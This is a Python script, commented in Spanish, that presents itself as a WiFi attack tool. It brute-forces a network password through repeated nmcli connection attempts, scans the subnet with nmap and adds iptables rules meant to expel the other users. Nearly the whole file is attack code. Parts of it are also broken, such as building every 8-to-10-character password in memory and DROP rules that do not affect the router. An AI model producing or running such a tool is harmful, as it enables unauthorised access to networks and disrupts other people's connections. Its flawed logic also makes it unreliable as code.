import itertools
import string
import subprocess
import re
import time
import socket
import os
from colorama import Fore, Style, init

# Inicializar Colorama
init(autoreset=True)

# Función para generar claves alfanuméricas
def generate_passwords(length):
    chars = string.ascii_letters + string.digits
    return [''.join(p) for p in itertools.product(chars, repeat=length)]

# Función para intentar conectarse a una red WiFi
def connect_to_wifi(ssid, password):
    try:
        command = f'sudo nmcli dev wifi connect "{ssid}" password "{password}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if "successfully" in result.stdout:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error al conectar a {ssid}: {e}")
        return False

# Función para extraer IPs de dispositivos conectados
def get_connected_devices():
    try:
        command = 'sudo nmap -sP 192.168.1.0/24 | grep "Nmap scan report" | awk \'{print $5}\''
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        ips = result.stdout.split('\n')
        return [ip for ip in ips if ip]
    except Exception as e:
        print(f"Error al escanear dispositivos: {e}")
        return []

# Función para expulsar usuarios del router excepto la IP del script
def kick_users_except_mine(router_ip, my_ip):
    try:
        command = f'sudo arp-scan --localnet | grep "{router_ip}" | awk \'{print $1}\''
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        devices = result.stdout.split('\n')
        for device in devices:
            if device and device != my_ip:
                kick_command = f'sudo iptables -A FORWARD -s {device} -j DROP'
                subprocess.run(kick_command, shell=True)
    except Exception as e:
        print(f"Error al expulsar usuarios: {e}")

# Función para realizar un ataque de fuerza bruta
def brute_force_attack(ssid):
    for length in range(8, 11):
        passwords = generate_passwords(length)
        for password in passwords:
            print(f"{Fore.YELLOW}Intentando con contraseña: {password}{Style.RESET_ALL}")
            if connect_to_wifi(ssid, password):
                print(f"{Fore.GREEN}Conectado exitosamente con la clave: {password}{Style.RESET_ALL}")
                return password
        print(f"{Fore.RED}No se encontró ninguna contraseña válida de longitud {length}{Style.RESET_ALL}")
    return None

# Función principal
def main():
    ssid = 'Tu_SSID_Aquí'  # Reemplaza con el SSID de la red WiFi
    my_ip = socket.gethostbyname(socket.gethostname())  # Obtener la IP del script

    print(f"{Fore.CYAN}Iniciando ataque de fuerza bruta contra {ssid}{Style.RESET_ALL}")
    correct_password = brute_force_attack(ssid)

    if correct_password:
        print(f"{Fore.GREEN}Contraseña correcta encontrada: {correct_password}{Style.RESET_ALL}")

        # Extraer IPs de dispositivos conectados
        connected_devices = get_connected_devices()
        print(f"{Fore.BLUE}Dispositivos conectados: {connected_devices}{Style.RESET_ALL}")

        # Expulsar usuarios del router excepto la IP del script
        router_ip = '192.168.1.1'  # Reemplaza con la IP de tu router
        kick_users_except_mine(router_ip, my_ip)
        print(f"{Fore.MAGENTA}Usuarios expulsados, excepto {my_ip}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}No se encontró ninguna contraseña válida{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
